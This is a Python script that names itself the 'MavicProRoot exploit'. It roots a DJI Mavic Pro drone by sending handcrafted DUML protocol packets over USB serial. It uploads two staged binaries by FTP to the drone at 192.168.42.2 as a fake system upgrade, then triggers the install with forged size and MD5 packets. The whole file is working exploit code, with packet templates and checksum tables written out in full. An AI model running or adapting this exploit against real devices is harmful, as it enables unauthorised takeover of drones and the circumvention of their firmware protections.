#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""

"""

import time
import os
import platform
import sys
import serial
import struct
import hashlib
import socket

from table_crc import *
from ftplib import FTP


def main():
    global upgrade_mode_packet

    upgrade_mode_packet = generate_upgrade_mode_packet()

    configure_usbserial()

    attack("stage1.bin")

    time.sleep(2)

    attack("stage2.bin")

    print ("--------------------------------------------------------------------------")
    ser.close


def attack(file_path):
    write_packet(upgrade_mode_packet ) # Enter upgrade mode (delete old file if exists)
    time.sleep(1)
    #write_packet(packet_2) # Enable Reporting
    upload_binary(file_path)
    time.sleep(0.3)
    file_size_packet = generate_file_size_packet(file_path)
    file_md5_packet = generate_file_md5_packet(file_path)

    write_packet(file_size_packet) # Send File size
    write_packet(file_md5_packet) # Send MD5 Hash for verification and Start Upgrade


def generate_upgrade_mode_packet():
    return bytearray.fromhex(u'55 16 04 FC 6A 28 00 00 40 00 07 00 00 00 00 00 00 00 00 00 64 0F')


def generate_file_size_packet(path):
    file_size = struct.pack('<L',int(os.path.getsize(path)))

    file_size_packet = bytearray.fromhex(u'55 1A 04 B1 6A 28 00 00 40 00 08 00')
    file_size_packet += file_size #append file size
    file_size_packet += bytearray.fromhex(u'00 00 00 00 00 00 02 04')

    packet_length = len(file_size_packet)
    crc = calc_checksum(file_size_packet,packet_length)
    crc = struct.pack('<H',crc)
    file_size_packet += crc

    return file_size_packet


def generate_file_md5_packet(path):
    # Calculate File md5 hash
    filehash = hashlib.md5()
    filehash.update(open(path).read())
    filehash = filehash.hexdigest()
    hex_data = filehash.decode("hex")
    md5_check = bytearray(hex_data)

    # File Verification and Start Upgrade
    file_md5_packet = bytearray.fromhex(u'55 1E 04 8A 6A 28 00 00 40 00 0A 00')
    file_md5_packet += md5_check

    packet_length = len(file_md5_packet)
    crc = calc_checksum(file_md5_packet,packet_length)
    crc = struct.pack('<H',crc)
    file_md5_packet += crc

    return file_md5_packet


def configure_usbserial():
    global comport

    # no command line args
    if len(sys.argv) < 2:
        comport = "/dev/ttyACM0"
        print ("Preparing to run MavicProRoot exploit using com port: " +comport)
        print ("If this is not the right device you can override by passing the device name as first argument to this script.\n")
    # parse command line args
    else:
        comport = sys.argv[1]
        print ("Preparing to run MavicProRoot exploit using com port: " +comport+ "\n")
    try:
        global ser
        ser = serial.Serial(comport)
        ser.baudrate = 115200
    except:
        print("Error: Could not open communications port " + comport + ".\n")
        sys.exit(0)


def write_packet(data):
    ser.write(data)     # write a string
    time.sleep(0.1)
    hexout = ' '.join(format(x, '02X') for x in data)
    if len(sys.argv) > 2 and sys.argv[2] == "debugmode":
        print (hexout)
    else:
        print("Sent DUML packet...\n")
    return

def send_duml_tcp(socket, source, target, cmd_type, cmd_set, cmd_id, payload = None):
    global sequence_number
    sequence_number = 0x34eb
    packet = bytearray.fromhex(u'55')
    length = 13
    if payload is not None:
        length = length + len(payload)

    if length > 0x3ff:
        print("Packet too large")
        exit(1)

    packet += struct.pack('B', length & 0xff)
    packet += struct.pack('B', (length >> 8) | 0x4) # MSB of length and protocol version
    hdr_crc = calc_pkt55_hdr_checksum(0x77, packet, 3)
    packet += struct.pack('B', hdr_crc)
    packet += struct.pack('B', source)
    packet += struct.pack('B', target)
    packet += struct.pack('<H', sequence_number)
    packet += struct.pack('B', cmd_type)
    packet += struct.pack('B', cmd_set)
    packet += struct.pack('B', cmd_id)

    if payload is not None:
        packet += payload

    crc = calc_checksum(packet, len(packet))
    packet += struct.pack('<H',crc)
    socket.send(packet)
    if len(sys.argv) > 2 and sys.argv[2] == "debugmode":
        print(' '.join(format(x, '02x') for x in packet))
    else:
        print("Sent DUML packet...\n")

    sequence_number += 1


def upload_binary(path):
    print("Opening FTP connection to 192.168.42.2...\n")
    ftp = FTP("192.168.42.2", "nouser", "nopass")
    fh = open(path, 'rb')
    ftp.set_pasv(True)	# this is the fix for buggy ftp uploads we ran into in early days -jayemdee
    ftp.storbinary('STOR /upgrade/dji_system.bin', fh)
    print (path + " uploaded to FTP with a remote file size of: " + str(ftp.size("/upgrade/dji_system.bin")))

    fh.close()
    ftp.quit()


def calc_pkt55_hdr_checksum(seed, packet, plength):
    arr_2A103 = [0x00,0x5E,0xBC,0xE2,0x61,0x3F,0xDD,0x83,0xC2,0x9C,0x7E,0x20,0xA3,0xFD,0x1F,0x41,
        0x9D,0xC3,0x21,0x7F,0xFC,0xA2,0x40,0x1E,0x5F,0x01,0xE3,0xBD,0x3E,0x60,0x82,0xDC,
        0x23,0x7D,0x9F,0xC1,0x42,0x1C,0xFE,0xA0,0xE1,0xBF,0x5D,0x03,0x80,0xDE,0x3C,0x62,
        0xBE,0xE0,0x02,0x5C,0xDF,0x81,0x63,0x3D,0x7C,0x22,0xC0,0x9E,0x1D,0x43,0xA1,0xFF,
        0x46,0x18,0xFA,0xA4,0x27,0x79,0x9B,0xC5,0x84,0xDA,0x38,0x66,0xE5,0xBB,0x59,0x07,
        0xDB,0x85,0x67,0x39,0xBA,0xE4,0x06,0x58,0x19,0x47,0xA5,0xFB,0x78,0x26,0xC4,0x9A,
        0x65,0x3B,0xD9,0x87,0x04,0x5A,0xB8,0xE6,0xA7,0xF9,0x1B,0x45,0xC6,0x98,0x7A,0x24,
        0xF8,0xA6,0x44,0x1A,0x99,0xC7,0x25,0x7B,0x3A,0x64,0x86,0xD8,0x5B,0x05,0xE7,0xB9,
        0x8C,0xD2,0x30,0x6E,0xED,0xB3,0x51,0x0F,0x4E,0x10,0xF2,0xAC,0x2F,0x71,0x93,0xCD,
        0x11,0x4F,0xAD,0xF3,0x70,0x2E,0xCC,0x92,0xD3,0x8D,0x6F,0x31,0xB2,0xEC,0x0E,0x50,
        0xAF,0xF1,0x13,0x4D,0xCE,0x90,0x72,0x2C,0x6D,0x33,0xD1,0x8F,0x0C,0x52,0xB0,0xEE,
        0x32,0x6C,0x8E,0xD0,0x53,0x0D,0xEF,0xB1,0xF0,0xAE,0x4C,0x12,0x91,0xCF,0x2D,0x73,
        0xCA,0x94,0x76,0x28,0xAB,0xF5,0x17,0x49,0x08,0x56,0xB4,0xEA,0x69,0x37,0xD5,0x8B,
        0x57,0x09,0xEB,0xB5,0x36,0x68,0x8A,0xD4,0x95,0xCB,0x29,0x77,0xF4,0xAA,0x48,0x16,
        0xE9,0xB7,0x55,0x0B,0x88,0xD6,0x34,0x6A,0x2B,0x75,0x97,0xC9,0x4A,0x14,0xF6,0xA8,
        0x74,0x2A,0xC8,0x96,0x15,0x4B,0xA9,0xF7,0xB6,0xE8,0x0A,0x54,0xD7,0x89,0x6B,0x35]

    chksum = seed
    for i in range(0, plength):
        chksum = arr_2A103[((packet[i] ^ chksum) & 0xFF)];
    return chksum

if __name__ == "__main__":
    main()

# vi: ft=python:tw=0:ts=4:sw=4

